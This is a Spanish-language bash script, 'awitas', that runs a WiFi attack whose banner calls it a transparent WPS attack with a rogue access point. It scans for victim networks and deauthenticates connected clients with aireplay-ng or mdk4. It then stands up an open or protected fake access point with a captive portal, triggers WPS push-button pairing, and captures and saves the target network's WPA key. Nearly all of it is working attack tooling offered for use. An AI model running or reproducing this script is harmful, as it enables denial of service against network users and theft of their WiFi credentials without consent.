#!/bin/bash
########################### byTux0
### Este script esta inspirado en el trabajo de Koala633 con su trabajo hostbase. https://github.com/Koala633/hostbase ###
###
####### Quiza te interese configurar las siguientes variabes###############
# Es el directorio donde se guardan las variables y las salidas de los comandos importantes. Muy interesante si se necesita depurar algo
pwd=/tmp/awitas/
# Es el tiempo (en segundos) de espera despues de quitar el modo monitor durante el ataque. Algunos dispositivos se toman su tiempo.
tiempo_espera_monitor=5
# Este es el tiempo (en segundos) de espera al reiniciar NertworManager durante el ataque. Algunos dispositivos tardan en volver a trabajar bien.
tiempo_espera=20
# Estos son los paquetes de desautenticacion que manda aireplay. Ponlos a tu gusto, a fin de cuentas a mi me da lo mismo..
desaut=60
# Estos son los segundos que estaremos haciendo el DoS con mdk4 si escogemos esta opcion.
tiempo_mdk4=40
############################################################################3
##################################
CYAN=`echo -e "\033[01;36m"`
VERDE=`echo -e "\e[32m"`
BLANCO=`echo -e "\e[0m"`
AZUL=`echo -e "\e[34m"`
ROJO=`echo -e "\e[31m"`
NORMAL=`echo -e "\033[1;37m"`
ULTRAVERDE=`echo -e "\e[1;32m"`
AMARILLO=`echo -e "\e[1;33m"`
VIOLETA=`echo -e "\e[1;35m"`
#################################
salida=salida
trap "$salida" EXIT
### Aqui se guardaran logs, variables y demas monsergas.
rm -rf ${pwd} 2>/dev/null
mkdir ${pwd} &>/dev/null
echo $canal >${pwd}/canal
canal_nuevo=2
pwd_local=$(pwd)
function salida () {
if [ $airodump = 1 ] 2>/dev/null ;then
	killall airodumop-ng &>/dev/null
fi
echo;echo -e "${AMARILLO}[::]${BLANCO} Limpieza!"
tput cnorm
echo;echo -e "${VERDE}[::]${BLANCO} Quitando modo monitor si esta puesto...!"
monitor quitar &>/dev/null
echo -e "${VERDE}[::]${BLANCO} Reiniciando NetworkManager..."
for proceso in nodogsplash berate dnsmasq hostapd wpa_supplicant ;do
	for i in `ps -e | grep $proceso | grep -v grep | awk -F ' ' '{print $1}'`;do
		echo -e "${VERDE}[::]${BLANCO} Matando PID $i de $proceso."
		kill -9 $i 
	done
done
pkill -P $$ >/dev/null 2>&1
echo -e "${VERDE}[::]${BLANCO} Todo limpio. Hasta la proxima!."; echo
echo -e "${ROJO}[!!]${BLANCO} Te recomiendo que si vas a volver a intentar el ataque, reinicies el equipo antes. La limpieza no siempre funciona."
echo $$ >${pwd}awitas.pid
exit 0
}
function abierto () {
pkill hostapd* 2>/dev/null
pkill wpa_supplicant 2>/dev/null
killall dnsmasq 2>/dev/null
rm ${pwd}dnsmasq &>/dev/null
rm /tmp/hostapd.psk &>/dev/null
touch /tmp/hostapd.psk &>/dev/null
cp resolv.conf ${pwd}resolv.conf &>/dev/null
dnsmasq -C dnsmasq.conf -q --log-facility=${pwd}dnsmasq -r ${pwd}resolv.conf &
dnsmasq_pid=$!
sleep 3
if [ $banda5 = si ];then
	bash berate_mod --hostapd-debug 2 --freq-band 5 --vanilla --no-dnsmasq $iface_ap $iface_net "${nombre_ap}" &>${pwd}berate & disown
else
	bash berate_mod --hostapd-debug 2 --vanilla --no-dnsmasq $iface_ap $iface_net "${nombre_ap}" &>${pwd}berate & disown
fi
berate_confirmado
berate_pid=$!
grep -v WebRoot nds.conf | grep -v GatewayInterface  > nodogsplash.conf
echo "WebRoot $ruta" >> nodogsplash.conf
interface_nodog=`ip address show | grep 192.168.12.1 -B5 | grep mtu | grep -v wlan0mon | grep -v $iface_dos | grep -v lo | cut -d ":" -f2 | tr -d ' '`
echo $interface_nodog >${pwd}interface_nodog
echo "GatewayInterface $interface_nodog" >> nodogsplash.conf
nodogsplash -c nodogsplash.conf >${pwd}nodogsplash &
nodogsplash_pid=$!
dos &
pid_dos=$!
while :
do
	sleep 30
	grep -i CONNECTED ${pwd}berate >/dev/null
	if [ $? = 0 ];then
		echo -e "${VERDE}[AP]${BLANCO}    Usuario conectado en nuestro punto de acceso! Parando DoS...${BLANCO}"
		kill $pid_dos
		echo -e "${VERDE}[DoS]${BLANCO}	Ataque DoS parado."
		kill $pid_wps_pbc &>/dev/null
		touch ${pwd}parar
    	break
	else
		echo -e "${CYAN}[AP]${BLANCO}	Nadie conectado todavia en nuestro punto de acceso. Seguimos..."
	fi
done
pbc_bucle
}
function crear_ap () {
if [ $tipo = 2 ];then
	abierto
fi
pkill hostapd* 2>/dev/null
pkill wpa_supplicant 2>/dev/null
killall dnsmasq 2>/dev/null
rm ${pwd}dnsmasq &>/dev/null
rm /tmp/hostapd.psk &>/dev/null
touch /tmp/hostapd.psk &>/dev/null
cp resolv.conf ${pwd}resolv.conf &>/dev/null
dnsmasq -C dnsmasq.conf -q --log-facility=${pwd}dnsmasq -r ${pwd}resolv.conf &
dnsmasq_pid=$!
sleep 3
if [ $banda5 = si ];then
	bash berate_mod --hostapd-debug 2 --freq-band 5  --vanilla --no-dnsmasq $iface_ap $iface_net "${nombre_ap}" 00000000 &>${pwd}berate &
else
	bash berate_mod  --hostapd-debug 2 --vanilla --no-dnsmasq $iface_ap $iface_net "${nombre_ap}" 00000000 &>${pwd}berate &
fi
berate_confirmado
berate_pid=$!
grep -v WebRoot nds.conf | grep -v GatewayInterface  > nodogsplash.conf
echo "WebRoot $ruta" >> nodogsplash.conf
interface_nodog=`ip address show | grep 192.168.12.1 -B5 | grep mtu | grep -v wlan0mon | grep -v $iface_dos | grep -v lo | cut -d ":" -f2 | tr -d ' '`
echo $interface_nodog >${pwd}interface_nodog
echo "GatewayInterface $interface_nodog" >> nodogsplash.conf
nodogsplash -c nodogsplash.conf >${pwd}nodogsplash &
nodogsplash_pid=$!
dos &
pid_dos=$!
while :
do
	sleep 30
	grep -i CONNECTED ${pwd}berate >/dev/null
	if [ $? = 0 ];then
		echo -e "${VERDE}[AP]${BLANCO}    Usuario conectado en nuestro punto de acceso! Parando DoS...${BLANCO}"
    	kill $pid_dos
    	echo -e "${VERDE}[DoS]${BLANCO}	Ataque DoS parado."
    	kill $pid_wps_pbc &>/dev/null
    	touch ${pwd}parar
    	break
	else
		echo -e "${CYAN}[AP]${BLANCO}	Nadie conectado todavia en nuestro punto de acceso. Seguimos..."
	fi
	kill $pid_wps_pbc &>/dev/null
	hostapd_cli -p /tmp/hostapd_ctrl wps_pbc >${pwd}hostapd_cli_wps_pbc &
	pid_wps_pbc=$!
done
pbc_bucle
}
function berate_confirmado() {
echo -e "${AMARILLO}[AP]${BLANCO}	Levantando punto de aceso... Si no pasas de esta pantalla, revisa que tu dispositivo sopote el modo AP.${BLANCO}"
while :
do
	grep ENABLE ${pwd}berate &>/dev/null
	if [ $? = 0 ];then
		echo -e "${VERDE}[AP]${BLANCO}	Punto de acceso con nombre ${AMARILLO} $nombre_ap${BLANCO} levantado! Seguimos...${BLANCO}"
		sleep 1
		break
	else
		sleep 5
	fi
done
}
echo "Vaya dedos tienes. Pon mas atencion.
Estas un poco torpe, no?.
No sabes escribir?.
Madre mia del amor hermoso que torpeza la tuya.
Tan dificil es?
Que usas, salchichas en vez de dedos?
Busco un tutorial en youtube de como teclear?" >${pwd}torpe
function validar_numero () {
if [[ $1 -eq "0" ]] 2>/dev/null;then
	echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $1${NORMAL} no es una respuesta valida. Pulsa enter para probar otra vez${NORMAL}"
	read
	$2
fi
numero='^[0-9]+$'
while :
do
	if [[ $1 =~ $numero ]];then
		break
	else
		echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $1${NORMAL} no es una repsuesta valida. Pulsa enter para probar otra vez${NORMAL}"
		read
		$2
		break
	fi
done
}
function comprobar_wpa () {
while :
do
	sleep 10
	ps fax | grep -i "wpa_supplicant -c ${pwd}pbc.conf" | grep -v grep &>/dev/null
	if [ $? -ne 0 ];then
		escuchar_wps
	fi
	if ( grep -q "network=" ${pwd}pbc.conf ) ;then
		grep "$nombre_ap" ${pwd}pbc.conf
		if [ $? -ne 0 ];then
			cp ${pwd}pbc.conf  ${red}_WPA.txt
			echo;echo -e "${VERDE}		Se tenso!! hemos conseguido la llave!${BLANCO}"
			wpa=`cat ${pwd}pbc.conf | grep psk= | cut -d '"' -f 2`
			ssid=`cat ${pwd}pbc.conf | grep ssid= | cut -d '"' -f 2`
			echo;echo -e "  ${AMARILLO} red ${VERDE} $ssid ${AMARILLO} WPA ${VERDE} $wpa ";echo
			echo -e "${AMARILLO}[::]${BLANCO}	Se ha creado un archivo con la WPA en el directorio de trabajo."
			echo -e "${AMARILLO}[::]${BLANCO}	Un placer y hasta la proxima!!!...ByTux0..."
			kill -9 $crono_pid &>/dev/null
			break
		fi
	fi
done
echo;echo -e "${AMARILLO}[::]${BLANCO}	Pulsa ctrl+c para salir."
}
function archivo_pbc () {
kill $pid_comprobar_wpa &>/dev/null
kill $wpa_supplicant_pid &>/dev/null
ls ${pwd}pbc.conf &>/dev/null
if [ $? -ne 0 ];then
	rm /var/run/wpa_supplicant/${iface_dos} 2>/dev/null
	echo "ctrl_interface=/var/run/wpa_supplicant 
	ctrl_interface_group=root
	update_config=1" >> ${pwd}pbc.conf
fi
comprobar_wpa
pid_comprobar_wpa=$!
}
function escuchar_wps () {
ls ${pwd}pbc.conf &>/dev/null
if [ $? -ne 0 ];then
	archivo_pbc
fi
rm /var/run/wpa_supplicant/${iface_dos} 2>/dev/null
pkill wpa_supplicant &>/dev/null
wpa_supplicant -c ${pwd}pbc.conf -i "$iface_dos" -B &>${pwd}wpa_supplicant
wpa_supplicant_pid=$!
if [ $? != 0 ]; then
	sleep 3
	monitor limpiar &>/dev/null
	escuchar_wps
fi
kill $pid_comprobar_wpa &>/dev/null
comprobar_wpa &
crono
crono_pid=$!
}
function crono () {
krono=30
while [ $krono -gt 0 ]; 
do
	krono=$((krono - 1))
	sleep 1
done
sleep 2
echo -e "${VIOLETA}[WPS]${BLANCO}	Reiniciamos escucha WPS"
kill $pid_wpacli &>/dev/null
sleep 3
wpa_cli -i "$iface_dos" wps_pbc any &>${pwd}wpa_cli &
pid_wpacli=$!
crono
crono_pid=$!
}
function pbc_bucle () {
echo -e "${VERDE}[WPS]${BLANCO}	Comenzamos a escuchar WPS"
sleep 2 
monitor quitar &>/dev/null
escuchar_wps
sleep 3
comprobar_wpa
pid_comprobar_wpa=$!
}
function comprobar () {
clear
banner
if [ $tipo -eq 1 ];then
	seguridad=protegido
elif [ $tipo -eq 2 ];then
	seguridad=abierto
fi
echo;echo -e "${AMARILLO} Vamos a comprobar todos los datos antes de empezar el ataque${BLANCO}."
red=`cat ${pwd}elegida | cut -d ',' -f14`
if [ $banda5 = "si" ];then
	banda=5GHz
else
	banda=2,4GHz
fi
if [ $mdk4 = "si" ];then
	ataque="Mdk4 dirigido a todos los clientes de la red"
else
	ataque="Aireplay dirigido a un solo cliente."
fi
echo;echo -e "${AMARILLO}[::]${BLANCO} Banda de ataque: ${VERDE} $banda"
echo -e "${AMARILLO}[::]${BLANCO} Red a atacar: ${VERDE} $red"
echo -e "${AMARILLO}[::]${BLANCO} Dispositivo para el ataque DoS: ${VERDE} $iface_dos"
echo -e "${AMARILLO}[::]${BLANCO} Dispositivo para crear el punto de acceso: ${VERDE} $iface_ap"
echo -e "${AMARILLO}[::]${BLANCO} Cliente a atacar: ${VERDE} $mac_estacion"
echo -e "${AMARILLO}[::]${BLANCO} Tipo de atauqe DoS: ${VERDE} $ataque"
echo -e "${AMARILLO}[::]${BLANCO} Nombre de nuestra red ${VERDE} $nombre_ap"
echo -e "${AMARILLO}[::]${BLANCO} Tipo de red ${VERDE} $seguridad"
echo -e "${AMARILLO}[::]${BLANCO} Dispositivo para dar internet: ${VERDE} $iface_net"
echo -e "${AMARILLO}[::]${BLANCO} Ruta de nuestro servidor http: ${VERDE} $ruta"
echo;echo -e "${AMARILLO}[::]${BLANCO} Opciones: "
echo;echo -e "   ${AMARILLO}1)${BLANCO}	Que se tense!! "
echo -e "   ${AMARILLO}2)${BLANCO}	Quiero volver a configurarlo todo. "
echo -e "   ${AMARILLO}3)${BLANCO}	Quiero volver a configurar los datos del punto de acceso. "
echo -e "   ${AMARILLO}4)${BLANCO}	Quiero volver a elegir red de las que ya hemos escaneado. "
echo -e "   ${AMARILLO}5)${BLANCO}	Quiero volver a escanear. "
echo;echo -ne "${AMARILLO}[??]${BLANCO}	Opcion: "
read opcion
validar_numero $opcion comprobar 
if [ $opcion -eq 1  ];then
	crear_ap
elif [ $opcion -eq 2 ];then
	empezar
elif [ $opcion -eq 3 ];then
    	config_ap
elif [ $opcion -eq 4 ];then
	parseo
elif [ $opcion -eq 5 ];then
    	airodump
else
	echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una repsueta valida. Pulsa enter para probar otra vez${NORMAL}"
	read
	comprobar
fi
}
function dos () {
clear
banner
rm ${pwd}parar &>/dev/null
echo;echo -e "${AMARILLO}   COMIENZA EL ATAQUE! Paciencia, ve a tomarte un cafe que esto va a llevar un rato. Estamos?${BLANCO}";echo
echo -e "${VERDE}[AP]${BLANCO}	Punto de acceso ${AMARILLO}$nombre_ap${BLANCO} levantado! Seguimos...${BLANCO}"
echo -e "${VERDE}[DoS]${BLANCO}	Inicia ataque DoS..."
while :
do
	ls ${pwd}parar &>/dev/null
	if [ $? = 0 ];then
    	break
	fi
	timeout=10
	canal_nuevo
	canal=$canal_nuevo
    echo -e "${AMARILLO}[DoS]${BLANCO}	El cliente esta en el canal${CYAN} ${canal}${BLANCO}. Seguimos el ataque..."
    echo -e "${AMARILLO}[DoS]${BLANCO}	Reiniciando DoS..."
    ip a | grep $iface_dos &>/dev/null
    if [ $? = 0 ];then
   		iw dev $iface_dos set channel $canal &>/dev/null
    else
    	monitor poner  &>/dev/null
	fi
	if [ $mdk4 = si ];then
		timeout --preserve-status --foreground $tiempo_mdk4 mdk4 $iface_mon e -t $macap -l &>>${pwd}mdk4
	else
		aireplay-ng -0 $desaut -a $macap -c $mac_estacion $iface_mon --ignore-negative-one &>>${pwd}aireplay
	fi
	pid_aireplay=$!
done
echo -e "${AMARILLO}[DoS]${BLANCO}	Ataque DoS parado por completo."
}
function canal_nuevo {
rm ${pwd}airodump_canal* 2>/dev/null
if [ $banda5 = si ];then
	timeout --preserve-status --foreground $timeout airodump-ng --band a --bssid $macap $iface_mon -w ${pwd}airodump_canal --output-format csv 2>${pwd}fallo_airodump5&>/dev/null
else
	timeout --preserve-status --foreground $timeout airodump-ng --bssid $macap $iface_mon -w ${pwd}airodump_canal --output-format csv 2>${pwd}fallo_airodum24&>/dev/null
fi
canal_nuevo=`cat ${pwd}airodump_canal-01.csv | grep $macap | grep WPA | awk -F "," '{print $4}'` &>/dev/null
if [ $banda5 = si ];then
	if (( canal_nuevo >=36 && canal_nuevo <= 165 ));then
	    echo "$canal_nuevo" >${pwd}canal_nuevo &>/dev/null
	else
    	echo -e "${ROJO}[DoS]${BLANCO}	No es posible determinar el canal de la red victima. Repetimos..."
    	timeout=$((timeout+2))
    	canal_nuevo
	fi
else
	if (( canal_nuevo >=1 && canal_nuevo <= 14 ));then
		echo "$canal_nuevo" >${pwd}canal_nuevo &>/dev/null
	else
		echo -e "${ROJO}[DoS]${BLANCO}	No es posible determinar el canal de la red victima. Repetimos..."
		timeout=$((timeout+2))
		canal_nuevo
	fi
fi
canal=$canal_nuevo
echo $canal ${pwd}canal &>/dev/null
}
function config_ap () {
clear
banner
echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora toca configurar nuestro punto de acceso${BLANCO}."
echo -e "${AMARILLO}[::]${BLANCO} Levantaremos un punto de acceso protegido (solo para clientes con windows) o abierto? ${BLANCO}";echo
echo -e "  ${AMARILLO}1)${BLANCO}  Protegido"
echo -e "  ${AMARILLO}2)${BLANCO}  Abierto"
echo;echo -ne "${AMARILLO}[??]${BLANCO} opcion: "
read tipo
validar_numero $tipo config_ap
if [ $tipo -ne 1 ] && [ $tipo -ne 2 ];then
	echo -ne "${ROJO}[!!]${BLANCO} $tipo no es una respuesta valida. Pulsa enter para intentarlo otra vez"
 	read
	config_ap
fi
echo;echo -ne "${AMARILLO}[::]${BLANCO} Nombre el punto de acceso que vamos a crear. (Necesario): "
read nombre_ap
echo $nombre_ap >${pwd}nombre_ap &>/dev/null
echo -ne "${AMARILLO}[::]${BLANCO} Iface con la que daremos salida a nuesto AP. Si no sabes que es esto, da enter y ya: "
read iface_net
ifconfig | grep "^${iface_net}" | grep -v $iface_ap | grep -v $iface_dos | grep -v $iface_mon | grep -v lo > /dev/null
if [ $? -ne 0 ];then
	iface_net=$(ifconfig | grep flags | grep -v $iface_ap | grep -v $iface_dos | grep -v $iface_mon | grep -v lo | cut -d ':' -f 1 | head -n 1)
	echo "$iface_net" >${pwd}iface_net
elif [ -z $iface_net ];then
	iface_net=$(ifconfig | grep flags | grep -v $iface_ap | grep -v $iface_dos | grep -v lo | grep -v $iface_mon | cut -d ':' -f 1 | head -n 1)
	echo "$iface_net" >${pwd}iface_net
fi
echo -ne "${AMARILLO}[::]${BLANCO} Ruta completa a nuestra carpeta http. ej. /root/miwebsite/ Por defecto se usara http/ (enter para usar esta): "
read ruta
if [ -z $ruta ];then
	ruta=`pwd`/http/
fi
ls $ruta &>/dev/null
if [ $? -ne 0 ];then
	echo -ne "${ROJO}[!!]${BLANCO} $ruta no es una ruta valida. Pulsa enter para intentarlo otra vez"        
	read
	config_ap
fi
comprobar
}
function clientes () {
clear
banner
sed -n ${1}p ${pwd}airodump >${pwd}elegida
macap=`cat ${pwd}elegida | cut -d ',' -f1`
maoui=`echo $macap | awk -F ":" '{print $1 $2 $3}'`
echo $cana1 >${pwd}canal &>/dev/null
rm ${pwd}macap 2>/dev/null
rm ${pwd}cliente* 2>/dev/null
echo "$macap" >${pwd}macap
marca=`grep $maoui oui.txt 2>/dev/null | cut -f3,4,5,6,7,8`
red=`cat ${pwd}elegida | cut -d ',' -f14`
echo;echo -e "${AMARILLO} TU ELECCION:"
echo;echo -e "${AMARILLO} Punto de acceso ${BLANCO}$red  ${AMARILLO}MAC ${BLANCO}$MAC $macap	${AMARILLO}Marca del dispositivo${BLANCO} $marca"
echo;echo -e "${AMARILLO} CLIENTES CONECTADOS:${BLANCO}";echo
cuenta=1
for i in `grep $macap ${pwd}airodump | grep -v WPA | cut -d ',' -f1`
do
	echo $i >${pwd}cliente${cuenta}
	maoui_cliente=`echo $i | awk -F ":" '{print $1 $2 $3}'`
	marca_cliente=`grep $maoui_cliente oui.txt 2>/dev/null | cut -f3,4,5,6,7,8`
	echo -e "	${CYAN}MAC ${BLANCO} $i ${CYAN}Marca del dispositivo ${BLANCO} $marca_cliente"
	cuenta=$((cuenta+1))
done
echo;echo -e "${AMARILLO}[::]${BLANCO} Elige una de las siguientes opciones:" ;echo
echo -e "		${AMARILLO}1)${BLANCO} Quiero elegir un cliente y continuar el ataque."
echo -e "		${AMARILLO}2)${BLANCO} Quiero elegir otra red de las que hemos escaneado ya."
echo -e "		${AMARILLO}3)${BLANCO} Quiero volver a escanear."
echo;echo -ne "${AMARILLO}[::]${BLANCO} Opcion: "
read respuesta
validar_numero $respuesta parseo
if [ $respuesta = 1 ];then
	clear
	banner
	echo;echo -e "${AMARILLO}[::]${BLANCO} Ok!. Escoge un numero de cliente ";echo
	cuenta=1
	for i in `grep $macap ${pwd}airodump | grep -v WPA | cut -d ',' -f1`
	do
	        maoui_cliente=`echo $i | awk -F ":" '{print $1 $2 $3}'`
        	marca_cliente=`grep $maoui_cliente oui.txt 2>/dev/null | cut -f3,4,5,6,7,8`
        	echo -e "${AMARILLO} ${cuenta}) ${CYAN}MAC ${BLANCO} $i ${CYAN}Marca del dispositivo ${BLANCO} $marca_cliente"
        	cuenta=$((cuenta+1))
	done
	echo;echo -ne "${AMARILLO}[::]${BLANCO} Opcion: "
	read opcion
	validar_numero $opcion parseo
	cuenta=$((cuenta-1))
	if [ $opcion -le $cuenta ]; then
		mac_estacion=`cat ${pwd}cliente${opcion}`
       		elegir_dos
	else
    		echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una repsuesta valida.  Pulsa enter para probar otra vez${NORMAL}"
       	read
       	parseo
    fi
elif [ $respuesta = 2 ];then
	parseo
elif [ $respuesta = 3 ];then
	airodump
else
	echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $respuesta${NORMAL} no es una opcion valida. Pulsa enter para probar otra vez${NORMAL}"
	read
	parseo
	exit
fi
}
function elegir_dos() {
clear
banner
echo;echo -e "${AMARILLO}[::]${BLANCO} Como quieres hacer el DoS?"
echo;echo -e "${AMARILLO}  1)${BLANCO}  Aireplay dirigido a un solo cliente."
echo -e "${AMARILLO}  2)${BLANCO}  Mdk4 contra todos los clientes de la red."
echo;echo -ne "${AMARILLO}[::]${BLANCO} Opcion: "
read opcion
validar_numero $opcion elegir_dos
if [ $opcion = "1" ];then
	mdk4=no
elif [ $opcion = "2" ];then
	mdk4=si
else
	echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion ${NORMAL}no es una respuesta valida. Pulsa enter para probar otra vez${NORMAL}"
	read
	elegir_dos
fi
config_ap
}

function banner () {
echo -e "${CYAN}                 _            "
echo -e "   __ ___      _(_) |_ __ _ ___ "
echo -e "  / _\` \\ \\ /\\ / / | __/ _\` / __|"
echo -e " | (_| |\\ V  V /| | || (_| \\__ \\"
echo -e "  \\__,_| \\_/\_/ |_|\\__\\__,_|___/ byTux0"
echo -e "  ${VIOLETA}Ataque WPS transparente con rogue AP${BLANCO}   "
}
function parseo () {
clear
banner
cuenta=1
sed '/^[[:space:]]*$/d' ${pwd}airodump_csv-01.csv | tail -n +2  > ${pwd}airodump
echo;echo -e "${AMARILLO}[::]${BLANCO} Redes encontradas:";echo
while IFS= read -r line
do
	echo $line | grep Station >/dev/null
	if [ $? = 0 ];then
		break
	fi
	mac=`echo $line | cut -d ',' -f1`
	grep $mac ${pwd}airodump | grep -v WPA >/dev/null 
	if [ $? = 0 ];then
		clients="${VERDE}si${BLANCO}"
	else
		clients="${ROJO}no${BLANCO}"
	fi
	echo " ${AMARILLO}${cuenta})	${CYAN}BSSID${BLANCO}	`echo $line |  cut -d ',' -f1`	${CYAN}Canal${BLANCO}	`echo $line |  cut -d ',' -f4`	${CYAN}clientes${BLANCO} $clients	${CYAN}Nombre Ap${BLANCO}	`echo $line | cut -d ',' -f14`"
	cuenta=$((cuenta+1))
done < ${pwd}airodump
echo;echo -ne "${AMARILLO}[??]${BLANCO} Elige una de ellas para estudiarla o no escribas nada para volver a escanear. Opcion: "
read red
if [ -v $red ];then
	airodump
else
	validar_numero $red parseo
	cuenta=$((cuenta-1))
	if [ $red -le $cuenta ]; then
		clientes $red 
	else
		echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL}. $red${NORMAL} no es una respuesta valida. Pulsa enter para probar otra vez${NORMAL}"
		read
		parseo
	fi
fi
}
function airodump () {
clear
banner
echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que haremos sera escanear para buscar una victima."
echo -e "${AMARILLO}[::]${BLANCO} Vamos a iniciar el escaneo. Ten en cuenta que necesitamos al menos un cliente con windows para el punto de acceso protegido."
echo -e "${AMARILLO}[::]${BLANCO} Cuando creas que ya es suficiente, cierra aierodump con ctrl+c y el script seguira su marcha."
echo -ne "${AMARILLO}[::]${BLANCO} Pulsa enter para iniciar el escaneo"
read
rm ${pwd}airodump* 2>/dev/null
airodump=1
if [ $banda5 = si ];then
	airodump-ng  --band a --wps --output-format csv --manufacturer $iface_mon -w ${pwd}airodump_csv #2>/dev/null
else
	airodump-ng  --wps --output-format csv --manufacturer $iface_mon -w ${pwd}airodump_csv 2>/dev/null
fi
airodump=0
parseo
}
function scan () {
echo -e "${AMARILLO}[::]${BLANCO} Poniendo $iface_dos en modo monitor..."
monitor poner
if [ $? = 0 ];then
	echo -e "${VERDE}[::]${BLANCO} Hecho!"
	sleep 1
else
	echo -e "${ROJO}[!!]${BLANCO} Algo salio mal. Saliendo..."
fi
airodump
}
function monitor () {
procesos="wpa_supplicant\|NetworkManager\|avahi-autoipd\|avahi-daemon\|net_applet"
#sudo rfkill unblock wlan
if [ $1 = quitar ];then
	ip link set dev $iface-dos down
	ip link set dev $iface-dos name $iface_dos
	ip link set dev $iface_dos up
	ip link set dev $iface_dos down
	iwconfig $iface_dos mode Managed
	ip link set dev $iface_dos up
elif [ $1  = poner ];then
	ip link set dev $iface_dos down
	if [ $? -eq 0 ];then
		airmon-ng check kill &>/dev/null
		iw dev $iface_dos set monitor none
    	ip link set dev $iface_dos up
		iface_mon=$iface_dos
   		echo $iface_mon >${pwd}iface_mon
   		echo $canal >${pwd}canal_mon &>/dev/null
	else
		echo " Se ha fallado al poner tu dispositivo en modo monitor. Revisa que tu dispositivo soporte esta opcion."
		exit 1
	fi
elif [ $1 = limpiar ];then
	echo "se ejecutar limpiar" >${pwd}limpiar
        ip link set dev $iface_dos down
        iwconfig $iface_dos mode Managed
        ip link set dev $iface_dos up
fi
}
function empezar () {
clear
banner
echo;echo -e "${CYAN} En la cabecera del sript puedes configurar algunas cosas. Quiza te venga bien."
echo;echo -e "${AMARILLO}[::]${BLANCO} Bienvenido a awitas."
if [ "$parrot" = "1" ];then
    echo;echo -e "${VERDE}[::]${BLANCO} Estamos en Parrot.";echo
elif [ "$kali" = "1" ];then
    echo;echo -e "${VERDE}[::]${BLANCO} Estamos en kali.";echo
else
    echo;echo -e "${VIOLETA}[!!]${BLANCO} Distribucion desconocida. No es parrot ni kali. Awitas no se ha testeado para esta distibucion.";echo
fi
if [ ! -e oui.txt ];then
	echo -e "${ROJO}[!!]${BLANCO} No tienes el archivo oui.txt o no esta actualizado. Este archivo servira para darnos las marcas de los dispositivos aunque no es necesario."
	echo -e "${AMARILLO}[::]${BLANCO} Escribe \"si\" para descargarlo o enter para no hacerlo. Si lo descargas ya no volveras a ver este mensaje. "
	echo;echo -ne "${AMARILLO}[??]${BLANCO} Respuesta: "
	read respuesta
	if [ "$respuesta" = si ];then
		echo -e "${VERDE}[>>]${BLANCO} Descargando..."
		wget https://standards.ieee.org/develop/regauth/oui/oui.txt &>/dev/null
		echo -e "${VERDE}[::]${BLANCO} Descargado!. Enter para continuar. "
		read; empezar
	else
		echo -e "${AMARILLO}[::]${BLANCO} Ok. Tu sabras.";echo
	fi
fi
echo -e "${AMARILLO}[::]${BLANCO} Elige la banda en la que haremos el ataque:";echo
echo -e "${AMARILLO}  1)${BLANCO}   Banda de 5 GHz."
echo -e "${AMARILLO}  2)${BLANCO}   Banda de 2,4 GHz."
echo;echo -ne "${AMARILLO}[??]${BLANCO} Opcion: "
read banda
validar_numero $banda empezar
if [ $banda -eq 1 ];then 
	banda5=si
	canal=100
elif [ $banda -eq 2 ];then
	banda5=no
	canal=6
else
	echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $banda${NORMAL} no es una respuesta valida. Pulsa enter para probar otra vez${NORMAL}"
    read
    empezar
fi
clear
banner
if [ $banda5 = si ];then
	echo;echo -e "${VIOLETA}[::]${BLANCO} El ataque se hara sobre la banda de 5 GHz"
else
	echo;echo -e "${VIOLETA}[::]${BLANCO} El ataque se hara sobre la banda de 2,4 GHz"
fi
echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que vamos a hacer es elegir un dispositivo para crear nuestro punto de acceso."
echo -e "${AMARILLO}[::]${BLANCO} Por favor, ten en cuenta que el dispositivo tiene que soportar la opcion de crear puto de acceso."
echo -ne "${AMARILLO}[::]${BLANCO} Pulsa enter para elegir dispositivo"
read
echo;echo -e "${AMARILLO}[::]${BLANCO} Estos son tus dispositivos:";echo
airmon-ng | cut  -f1 --complement
airmon-ng | cut  -f1 --complement | grep -v Interface | sed '/^ *$/d' > ${pwd}airmon 2>/dev/null
echo;echo -e "${AMARILLO}[::]${BLANCO} Elige un dispositivo para crear nuestro punto de acceso.";echo
cuenta=1
for i in `cat ${pwd}airmon | cut -f1`
do
	echo -e " ${AMARILLO}${cuenta})${BLANCO}  $i "
	cuenta=$((cuenta+1))
done
echo;echo -e "${AMARILLO}[::]${BLANCO} Si estas en raspberry, la integrada de la 3b solo soporta 2,4 GHz. La 4 y superiores, soportan 2,4 y 5 GHz y son perfectamente validas."
echo -ne "${AMARILLO}[??]${BLANCO} Debes estar seguro que soporta el modo AP. Opcion: "
read opcion
validar_numero $opcion empezar
cuenta=$((cuenta-1))
if [ $opcion -le $cuenta ]; then
    cuenta=$((cuenta+1))
    sed -n ${opcion}p ${pwd}airmon | cut -f 1 >${pwd}iface_ap
    iface_ap=`cat ${pwd}iface_ap`
    echo -e "${AMARILLO}[::]${BLANCO} Ok!. Usaremos ${VERDE}$iface_ap ${BLANCO}para crear nuestro punto de acceso. Pulsa enter para continuar."
    read
else
    echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una repsuesta valida. Pulsa enter para probar otra vez${NORMAL}"
    read
    empezar
fi
elegir_monitor
}
function elegir_monitor () {
clear
banner
echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que haremos sera elegir un dispositivo para el ataque DoS."
echo -e "${AMARILLO}[::]${BLANCO} Debes estar seguro de que el dispositivo tiene la capacidad de inyectar paquetes."
echo -e -e "${AMARILLO}[::]${BLANCO} Pulsa enter para continuar."
read
echo -e  "${AMARILLO}[::]${BLANCO} Estos son los dispositivos que quedan disponibles:"
airmon-ng | cut  -f1 --complement | grep -v $iface_ap
